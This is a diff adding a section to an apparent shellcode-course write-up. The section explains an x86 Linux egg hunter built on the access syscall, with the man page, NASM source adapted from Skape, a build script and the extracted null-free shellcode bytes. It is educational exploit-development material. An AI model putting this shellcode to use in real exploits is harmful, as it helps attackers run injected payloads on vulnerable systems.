@@ -31,9 +31,181 @@ The technique is used to avoid the limitation of consecutive memory locations av
 
 Caveats to an Egg Hunter, it must avoid locating itself in memory and jumping to the incorrect address, it must be robust, small in size and fast. A 4 byte egg can be used and repeated twice to mark the payload, the Virtual Address Space (VAS) is searched for these two consecutive tags and redirects execution flow once the pattern is matched.
 
-The popular Skape paper was referenced to better understand the implementation of the Egg Hunter, the link to the research can be found [here] [skape-link].
+The popular paper by Skape was referenced to better understand the implementation of the Egg Hunter, the link to the research can be found [here] [skape-link].
 
 [skape-link]: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
+
+#### Access Syscall
+----
+
+A look up in the header file reveals the values for the access syscall:
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep access
+#define __NR_access		 33
+```
+
+The definition of the access syscall function in the man pages describes the arguments required:
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ man access
+
+ACCESS(2)                                  Linux Programmer's Manual                                 ACCESS(2)
+
+NAME
+       access - check real user's permissions for a file
+
+SYNOPSIS
+       #include <unistd.h>
+
+       int access(const char *pathname, int mode);
+
+DESCRIPTION
+       access()  checks  whether  the calling process can access the file pathname.  If pathname is a symbolic
+       link, it is dereferenced.
+
+       The mode specifies the accessibility check(s) to be performed, and is either the value F_OK, or a  mask
+       consisting  of  the bitwise OR of one or more of R_OK, W_OK, and X_OK.  F_OK tests for the existence of
+       the file.  R_OK, W_OK, and X_OK test whether the file exists and grants read, write, and  execute  per-
+       missions, respectively.
+
+       The  check  is  done  using the calling process's real UID and GID, rather than the effective IDs as is
+       done when actually attempting an operation (e.g., open(2)) on the file.  This allows  set-user-ID  pro-
+       grams to easily determine the invoking user's authority.
+
+       If the calling process is privileged (i.e., its real UID is zero), then an X_OK check is successful for
+       a regular file if execute permission is enabled for any of the file owner, group, or other.
+
+RETURN VALUE
+       On success (all requested permissions granted), zero is returned.  On error (at least one bit  in  mode
+       asked  for a permission that is denied, or some other error occurred), -1 is returned, and errno is set
+       appropriately.
+
+ERRORS
+       access() shall fail if:
+
+       EACCES The requested access would be denied to the file, or search permission is denied for one of  the
+              directories in the path prefix of pathname.  (See also path_resolution(7).)
+
+       ELOOP  Too many symbolic links were encountered in resolving pathname.
+
+       ENAMETOOLONG
+              pathname is too long.
+
+       ENOENT A component of pathname does not exist or is a dangling symbolic link.
+
+       ENOTDIR
+              A component used as a directory in pathname is not, in fact, a directory.
+
+       EROFS  Write permission was requested for a file on a read-only file system.
+
+       access() may fail if:
+
+       EFAULT pathname points outside your accessible address space.
+```
+
+Note is made of the fact that EFAULT (0xf2) should be avoided, as the error states the pathname would point outside the accessible address space.
+
+#### Assembly Code (Updating the Skape code reference)
+-------------
+
+````nasm
+; Filename: egghunter.nasm
+; Author: h3ll0clar1c3
+; Purpose: Egghunter, spawning a shell on the local host
+; Compilation: ./compile.sh egghunter
+; Usage: ./egghunter
+; Shellcode size: ?? bytes
+; Architecture: x86
+
+global   _start
+
+section .text
+        _start:
+
+	; initialize register
+	xor edx, edx
+	
+	next_page:
+	or dx, 0xfff		; set dx to 4095
+	
+	next_address:
+	inc edx			; incdx to 4096 (PAGE_SIZE)
+	lea ebx, [edx +0x4]	; load 0x1004 into ebx
+	push byte +0x21		; 0x21 is dec 33 (access syscall)
+	pop eax			; put the syscall value into eax
+	int 0x80		; call the interrupt, execute the syscall
+	
+	cmp al, 0xf2		; check if return value is EFAULT (0xf2)
+	jz next_page		; if EFAULT is encountered, jump back to next_page 
+	mov eax, 0x50905090	; move unique egg value into eax
+	mov edi, edx
+	scasd			; search for first 4 byte pattern of the egg
+	jnz next_address
+	scasd			; search for second 4 byte pattern of the egg
+	jnz next_address
+	jmp edi			; jump to egg payload
+````
+
+The Assembly code is compiled by assembling with Nasm, and linking with the following bash script whilst outputting an executable binary:
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ cat compile.sh
+#!/bin/bash
+
+echo '[+] Assembling with Nasm ... '
+nasm -f elf32 -o $1.o $1.nasm
+
+echo '[+] Linking ...'
+ld -o $1 $1.o
+
+echo '[+] Done!'
+```
+
+The Assembly code compiled as an executable binary:
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh egghunter
+[+] Assembling with Nasm ... 
+[+] Linking ...
+[+] Done!
+```
+
+#### Customize Shellcode 
+------
+
+Objdump is used to extract the shellcode from the Egg Hunter in hex format (Null free):
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./egghunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 #### Reverse TCP Shell in C
 --------
